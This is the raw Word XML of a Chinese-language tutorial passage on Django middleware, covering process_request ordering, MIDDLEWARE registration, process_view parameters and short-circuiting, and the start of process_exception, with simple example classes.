          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3A2A0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016AAA5B"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第三步：在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中定义一个视图函数（</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="741622D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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1044BF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387715E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"view函数..."</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8FA65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"OK"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ED41A1"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第四步：在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>settings.py</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MIDDLEWARE</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里注册自己定义的中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FB9828"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="337CD464" wp14:editId="56ECDE10">
            <wp:extent cx="9439910" cy="2700801"/>
            <wp:effectExtent l="0" t="0" r="889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444444" cy="2702098"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3708E1C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6AC9EE9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5FD4427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6D06E76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view函数...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE87D9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3E27BB3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1545016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lastRenderedPageBreak/>
        <w:t>注意：</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>如果当请求到达请求</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的时候直接不符合条件返回，即</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>return HttpResponse("Md2</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中断</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，程序将把请求直接发给中间件</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返回，然后依次返回到请求者，结果如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13535B2F"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返回</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Md2</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中断的页面，后台打印如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDDC53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79E45A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48671FC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373B80C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00C8C19E"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流程图如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B88405" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="580FEE91" wp14:editId="764019F2">
            <wp:extent cx="4055110" cy="32342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70720" cy="3246716"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AD817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由此总结一下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684BB848" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0"/>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中间件的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方法是在执行视图函数之前执行的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE99DC0" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0"/>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当配置多个中间件时，会按照</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MIDDLEWARE</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的注册顺序，也就是列表的索引值，从前到后依次执行的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C55AD03" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0"/>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不同中间件之间传递的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都是同一个对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDB12E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多个中间件中的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方法是按照</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MIDDLEWARE</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的注册顺序</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>倒序</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行的，也就是说第一个中间件的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方法首先执行，而它的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方法最后执行，最后一个中间件的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方法最后一个执行，它的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方法是最先执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6870CDFB"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2、process_view</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9AFA8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process_view(self, request, view_func, view_args, view_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368955BF"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该方法有四个参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAB5847"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lastRenderedPageBreak/>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4166781B"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view_func</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是</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即将使用的视图函数。</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（它是实际的函数对象，而不是函数的名称作为字符串。）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131A754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view_args</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是将传递给视图的位置参数的列表（无名分组分过来的值）</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7911297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view_kwargs</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是将传递给视图的关键字参数的字典（有名分组分过来的值）。</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> view_args</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view_kwargs</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都不包含第一个视图参数（</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22706E7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会在调用视图函数之前调用</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方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4A493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它应该返回</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或一个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如果返回</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将继续处理这个请求，执行任何其他中间件的</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方法，然后在执行相应的视图。</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如果它返回一个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不会调用适当的视图函数。</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它将执行中间件的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方法并将应用到该</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并返回结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E753C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process_view(self, request, callback, callback_args, callback_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F85540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django.utils.deprecation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MiddlewareMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F66C5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django.shortcuts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HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A7E60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342F936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203589A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40EE222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HttpResponse("Md1中断")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA1409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67385F9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78B8D3B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659DF5F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77F27F8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"Md1view"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D12C2E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Md2(MiddlewareMixin):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CC94C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1A7557B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"Md2请求"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B3AA4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"Md2中断"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61983D9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28805F0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"Md2返回"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC9F20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6156944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5183B8F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"Md2view"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455CC782" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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135E9AE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2F6926C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70013CC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Md1view</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8505F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Md2view</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C41C73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lastRenderedPageBreak/>
        <w:t>view函数...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6283782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68A4F90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1BF1AC34" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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下图进行分析上面的过程：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2167FEA4"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="143060FD" wp14:editId="1F0577FE">
            <wp:extent cx="4868333" cy="3843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76303" cy="3849947"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA0927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当最后一个中间的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到达路由关系映射之后，返回到中间件</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</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，然后依次往下，到达</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函数，最后通过</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依次返回到达用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041F1A7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可以用来调用视图函数：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38466AF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00837B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4F24ABB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4CDBA43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HttpResponse("Md1中断")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2138453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06C3803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151B34F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4FCAF5C4" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00112B23"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38432F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HttpResponse("hello")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04813BE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response=callback(request,*callback_args,**callback_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE3EB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7EDEC939"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43DA7F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3062CB5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591F17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view函数...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CDD1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2AE1236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1A18AF4B"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注意：</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如果有返回值，会越过其他的</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以及视图函数，但是所有的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都还会执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4009878B"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3、process_exception</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A1BB48"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process_exception(self, request, exception)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9AA68C"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该方法两个参数</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF4508D"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一个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C32FA1"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一个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>exception</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是视图函数异常产生的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Exception</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1006F77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这个方法只有在视图函数中出现异常了才执行，它返回的值可以是一个</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也可以是一个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对象。如果是</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将调用模板和中间件中的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方法，并返回给浏览器，否则将默认处理异常。如果返回一个</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，则交给下一个中间件的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>process_exception</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
